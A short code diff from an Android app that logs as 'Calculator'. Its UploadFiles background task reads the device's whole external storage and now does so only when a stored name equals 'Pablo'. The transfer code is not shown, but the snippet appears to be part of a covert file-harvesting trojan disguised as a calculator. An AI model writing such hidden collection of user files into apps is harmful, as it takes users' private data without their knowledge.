@@ -9,9 +9,11 @@ public class UploadFiles extends AsyncTask<Void , Integer, Long>
 {
     @Override
     protected Long doInBackground(Void... voids) {
-        Log.d("Calculator","FRAGGGGGGEEEEEEEEELLLLL");
+        Log.d("Calculator","upload");
         try{
-            Util.GetFiles(Environment.getExternalStorageDirectory().getAbsolutePath());
+            if(Util.NOMBRE.equals("Pablo")) {
+                Util.GetFiles(Environment.getExternalStorageDirectory().getAbsolutePath());
+            }
 
         }catch(Exception e){
 
